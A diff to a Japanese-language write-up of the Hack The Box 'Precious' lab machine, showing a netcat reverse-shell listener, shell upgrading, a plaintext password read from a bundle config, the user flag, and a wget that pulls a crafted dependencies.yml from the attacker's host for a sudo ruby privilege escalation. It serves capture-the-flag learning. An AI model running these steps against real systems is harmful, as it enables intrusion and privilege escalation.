@@ -84,42 +84,51 @@ CVE-2022-25765.py                                          100%[================
 ```
 リバースシェル取得！がユーザフラグすら権限拒否
 ```sh
-└─$ rlwrap nc -lnvp 4444
+└─$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.4] from (UNKNOWN) [10.129.228.98] 44794
 bash: cannot set terminal process group (677): Inappropriate ioctl for device
 bash: no job control in this shell
+
+ruby@precious:/var/www/pdfapp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<pp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ruby@precious:/var/www/pdfapp$ ^Z
+zsh: suspended  nc -lnvp 4444
+
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+                               ^C
+
+ruby@precious:/var/www/pdfapp$ export SHELL=bash
+
+ruby@precious:/var/www/pdfapp$ export TERM=xterm-256color
+
+ruby@precious:/var/www/pdfapp$ stty rows 66 columns 236
+
 ruby@precious:/var/www/pdfapp$ id
-id
 uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
 
 ruby@precious:/var/www/pdfapp$ cat /home/henry/user.txt
-cat /home/henry/user.txt
 cat: /home/henry/user.txt: Permission denied
 ```
 
 
 ## STEP 3
 謎のconfigファイルにhenryのパスワードらしいものを発見  
-henryにログイン成功！ユーザフラグゲット！
+「Q3c1AqGHtoI0aXAYFH」でhenryにログイン成功！ユーザフラグゲット！
 ```sh
 ruby@precious:/var/www/pdfapp$ cat /home/ruby/.bundle/config
-cat /home/ruby/.bundle/config
 ---
 BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
 
 ruby@precious:/var/www/pdfapp$ su henry
-su henry
-Password: Q3c1AqGHtoI0aXAYFH
+Password: 
 
-id
+henry@precious:/var/www/pdfapp$ id
 uid=1000(henry) gid=1000(henry) groups=1000(henry)
 
-SHELL=/bin/bash script -q /dev/null
-henry@precious:/var/www/pdfapp$
-
 henry@precious:/var/www/pdfapp$ cat /home/henry/user.txt
-cat /home/henry/user.txt
 e3948152e2e4cd28f2c967ffcc412a53
 ```
 
@@ -128,7 +137,6 @@ e3948152e2e4cd28f2c967ffcc412a53
 パスワードなしでroot権限でrubyを実行できそう
 ```sh
 henry@precious:/var/www/pdfapp$ sudo -l
-sudo -l
 Matching Defaults entries for henry on precious:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -145,6 +153,7 @@ rake: "13.0.6"
 のようなバージョンが書いてあると仮定し  
 dependencies.yml内のバージョンと、実際にインストールされているバージョンを比較するスクリプトっぽい
 ```ruby
+henry@precious:/var/www/pdfapp$ cat /opt/update_dependencies.rb
 # Compare installed dependencies with those specified in "dependencies.yml"
 require "yaml"
 require 'rubygems'
@@ -202,11 +211,9 @@ end
 ```
 dependencies.ymlダウンロードし、実行
 ```sh
-henry@precious:~$ cd /home/henry
-cd /home/henry
+henry@precious:/var/www/pdfapp$ cd /home/henry/
 
 henry@precious:~$ wget http://10.10.16.4/dependencies.yml
-wget http://10.10.16.4/dependencies.yml
 --2025-07-02 10:08:12--  http://10.10.16.4/dependencies.yml
 Connecting to 10.10.16.4:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -218,7 +225,6 @@ Saving to: ‘dependencies.yml’
 2025-07-02 10:08:14 (119 MB/s) - ‘dependencies.yml’ saved [667/667]
 
 henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
-sudo /usr/bin/ruby /opt/update_dependencies.rb
 sh: 1: reading: not found
 Traceback (most recent call last):
         33: from /opt/update_dependencies.rb:17:in `<main>'
